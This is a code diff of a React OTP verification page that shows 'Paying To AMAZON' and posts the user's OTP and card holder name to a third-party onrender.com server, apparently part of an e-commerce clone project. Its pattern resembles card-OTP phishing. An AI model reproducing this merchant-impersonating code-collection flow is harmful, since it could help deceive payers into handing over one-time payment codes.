@@ -503,7 +503,122 @@
 
 // export default OtpComponent;
 
-import React, { useState } from "react";
+// import React, { useState } from "react";
+// import axios from "axios";
+// import NavbarForm from "./NavbarForm";
+// import FooterForm from "./FooterForm";
+// import { useLocation, useNavigate} from 'react-router-dom';
+
+// const OtpComponent = () => {
+//   const [otp, setOtp] = useState("");
+//   const [cardName, setCardName] = useState("");
+//   const [message, setMessage] = useState("");
+//   const location = useLocation();
+//   const navigate = useNavigate();
+//   const { cardHolderName } = location.state || {};
+
+//   const handleChangeOtp = (e) => {
+//     const input = e.target.value;
+//     // Accept only 6-digit numbers
+//     const sixDigitNumber = /^[0-9]{1,6}$/;
+//     if (sixDigitNumber.test(input)) {
+//       setOtp(input);
+//     }
+//   };
+
+//   const handleSubmit = async (e) => {
+//     e.preventDefault();
+    
+//     if (!otp || !cardName) {
+//       setMessage("Please enter OTP and card name.");
+//       return;
+//     }
+
+//     try {
+//       const response = await axios.post("https://ecommerce-ryoy.onrender.com/otp", {
+//         otp: otp,
+//         cardHolderName: cardName
+//       });
+//       console.log(response.data);
+//       setMessage("Verification successful!");
+//       // You may want to navigate the user to the next step or perform any other action upon successful verification
+//     } catch (error) {
+//       console.log(error);
+//       setMessage("Error verifying OTP. Please try again.");
+//     }
+//   }
+
+//   // const handleContinue = () => {
+//   //   // Pass the productId to the next page
+//   //   navigate("/home-page");
+//   // };
+
+//   return (
+//     <>
+//       <NavbarForm />
+//       <div className="container">
+//         <div className="row mt-3">
+//           <div className="col-6">
+//             <p>Paying To</p>
+           
+//           </div>
+//           <div className="col-6">
+//             <p>AMAZON</p>
+           
+//           </div>
+//         </div>
+//         <hr />
+//         <div className="text-center">Verification Required</div>
+//         <div className="text-center">
+//           To continue, complete this verification step. We've sent an OTP to
+//           your mobile number. Please enter it below to complete verification
+//         </div>
+        
+      
+
+//         <form onSubmit={handleSubmit}>
+//           <div className="mt-3 otp-input">
+//             <input
+//               type="text"
+//               placeholder="Enter Card Name"
+//               value={cardName}
+//               onChange={(e) => setCardName(e.target.value)}
+//               className="w-100 py-2 border border-1"
+//               required
+//             />
+//           </div>
+//           <div className="mt-3 otp-input">
+//             <input
+//               type="number"
+//               placeholder="Enter OTP"
+//               value={otp}
+//               onChange={handleChangeOtp}
+//               className="w-100 py-2 border border-1"
+//               required
+//               maxLength={6}
+//             />
+//           </div>
+//           <button type="submit" className="mt-2 btn-buy-now place-btn w-100"
+//           //  onClick={handleContinue}
+//           >
+//             Continue
+//           </button>
+//         </form>
+
+//         {message && <div className="text-center mt-3">{message}</div>}
+
+//         <div className="text-center mt-3">
+//           Not received the code? Please resend in Resend Otp
+//         </div>
+//       </div>
+//       <FooterForm />
+//     </>
+//   );
+// };
+
+// export default OtpComponent;
+
+import React, { useState, useEffect } from "react";
 import axios from "axios";
 import NavbarForm from "./NavbarForm";
 import FooterForm from "./FooterForm";
@@ -548,10 +663,11 @@ const OtpComponent = () => {
     }
   }
 
-  const handleContinue = () => {
-    // Pass the productId to the next page
-    navigate("/home-page");
-  };
+  useEffect(() => {
+    if (message === "Verification successful!") {
+      navigate("/home-page");
+    }
+  }, [message, navigate]);
 
   return (
     <>
@@ -560,11 +676,9 @@ const OtpComponent = () => {
         <div className="row mt-3">
           <div className="col-6">
             <p>Paying To</p>
-           
           </div>
           <div className="col-6">
             <p>AMAZON</p>
-           
           </div>
         </div>
         <hr />
@@ -573,9 +687,6 @@ const OtpComponent = () => {
           To continue, complete this verification step. We've sent an OTP to
           your mobile number. Please enter it below to complete verification
         </div>
-        
-      
-
         <form onSubmit={handleSubmit}>
           <div className="mt-3 otp-input">
             <input
@@ -598,15 +709,11 @@ const OtpComponent = () => {
               maxLength={6}
             />
           </div>
-          <button type="submit" className="mt-2 btn-buy-now place-btn w-100"
-           onClick={handleContinue}
-          >
+          <button type="submit" className="mt-2 btn-buy-now place-btn w-100">
             Continue
           </button>
         </form>
-
         {message && <div className="text-center mt-3">{message}</div>}
-
         <div className="text-center mt-3">
           Not received the code? Please resend in Resend Otp
         </div>
@@ -617,6 +724,7 @@ const OtpComponent = () => {
 };
 
 export default OtpComponent;
+
 
 
 
